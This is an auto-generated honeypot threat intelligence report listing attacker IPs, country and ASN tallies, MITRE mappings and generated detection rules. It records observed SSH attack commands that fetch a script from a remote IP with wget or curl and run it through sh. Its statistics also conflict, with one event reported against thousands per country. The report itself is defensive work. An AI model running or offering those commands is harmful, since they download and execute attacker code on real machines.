# Threat Intelligence Report

**Generated**: 2026-04-07 15:36 UTC  
**Source**: LLM Honeypot Intelligence Platform  
**Window**: Last 24 hours  
**Classification**: TLP:AMBER

---

## Executive Summary

In the past 24 hours, the honeypot platform observed **1 events** from **536 unique source IPs** across **33 countries** and **45 autonomous systems**.

| Metric | Value |
|--------|-------|
| SSH Events (Beelzebub) | 1 |
| HTTP Events (Galah) | 0 |
| Unique Attacker IPs | 536 |
| Atomic Attack Patterns | 5 |
| MITRE ATT&CK Techniques | 3 |
| Generated Sigma Rules | 1 |
| Generated YARA Rules | 1 |
| Generated Suricata Rules | 0 |
| Blocked IPs (Firewall) | 505 |

---

## MITRE ATT&CK Mapping

| Technique | Name | Count |
|-----------|------|-------|
| T1105 (Ingress Tool Transfer) | | 2 |
| T1082 (System Information Discovery) | | 1 |
| T1059.004 (Unix Shell) | | 1 |

### Tactics Distribution

- **command_and_control**: 2 events █
- **discovery**: 1 events 
- **execution**: 1 events 

---

## Geographic Distribution

### Top Source Countries

| Country | Events |
|---------|--------|
| United States | 6,088 |
| Brazil | 5,806 |
| France | 3,861 |
| Bulgaria | 1,377 |
| Germany | 660 |
| United Kingdom | 393 |
| The Netherlands | 367 |
| China | 294 |
| Belgium | 294 |
| Russia | 250 |
| Portugal | 172 |
| Singapore | 158 |
| Hong Kong | 152 |
| Pakistan | 134 |
| Canada | 120 |

### Top ASNs (Autonomous Systems)

| ASN | Events |
|-----|--------|
| LANTEC COMUNICACAO MULTIMIDIA LTDA | 5,800 |
| Modat B.V. | 3,608 |
| DigitalOcean, LLC | 2,287 |
| ColocaTel Inc. | 1,340 |
| Google LLC | 1,132 |
| Amazon.com, Inc. | 976 |
| Alibaba US Technology Co., Ltd. | 601 |
| ONYPHE SAS | 492 |
| Censys, Inc. | 490 |
| Vpsvault.host Ltd | 484 |
| Hurricane Electric LLC | 325 |
| Tube-Hosting | 288 |
| UCLOUD INFORMATION TECHNOLOGY HK LIMITED | 271 |
| Microsoft Corporation | 263 |
| Detai Prosperous Technologies Limited | 171 |

---

## Top Attacker IPs

| IP | Hits | Category |
|----|----- |----------|
| `187.108.1.130` | 5,800 | Attacker |
| `85.11.167.11` | 1,274 | Attacker |
| `157.230.235.42` | 1,260 | Attacker |
| `165.245.172.231` | 745 | Attacker |
| `85.217.140.45` | 431 | Attacker |
| `185.91.127.85` | 288 | Attacker |
| `85.217.140.13` | 281 | Attacker |
| `85.217.140.37` | 258 | Attacker |
| `45.205.1.110` | 244 | Attacker |
| `85.217.140.41` | 221 | Attacker |
| `85.217.140.40` | 210 | Attacker |
| `85.217.140.43` | 195 | Attacker |
| `45.205.1.5` | 179 | Attacker |
| `85.217.140.49` | 159 | Attacker |
| `85.217.140.52` | 148 | Attacker |
| `85.217.140.29` | 144 | Attacker |
| `18.218.118.203` | 137 | Attacker |
| `16.58.56.214` | 134 | Attacker |
| `85.217.140.48` | 130 | Attacker |
| `18.116.101.220` | 124 | Attacker |

---

## Indicators of Compromise (IOCs)

| Type | Count |
|------|-------|
| IPv4 Addresses | 536 |
| URLs | 1 |
| Domains | 0 |
| SHA256 Hashes | 0 |
| File Paths | 0 |

### Extracted URLs

- `https://46.151.182.82/sh`

---

## Top Attack Patterns (SSH)

- [1x] `uname -a`
- [1x] `echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A`
- [1x] `wget --no-check-certificate -qO- https://46.151.182.82/sh`
- [1x] `curl -sk https://46.151.182.82/sh`
- [1x] `sh -s ssh`

## Top Attack Patterns (HTTP)

| URI | Hits | Category |
|-----|------|----------|
| `/favicon.ico` | 2 | Web Scan |

### HTTP Methods

- **GET**: 87
- **PROPFIND**: 13

---

## Generated Rules Summary

All rules are stored in: `/data/ollama-proxy/generated-rules/`

| Format | Count | Path |
|--------|-------|------|
| Sigma (SIEM) | 1 | `sigma/*.yml` |
| YARA (Payload) | 1 | `yara/*.yar` |
| Suricata (IDS/IPS) | 0 | `suricata/honeypot.rules` |
| Firewall (iptables) | 505 IPs | `firewall/blocklist_*.sh` |
| STIX 2.1 Bundle | 1 | `stix/bundle.json` |
| IOC List | 1 | `iocs/ioc_list.json` |

---

*Report generated automatically by LLM Honeypot Intelligence Platform*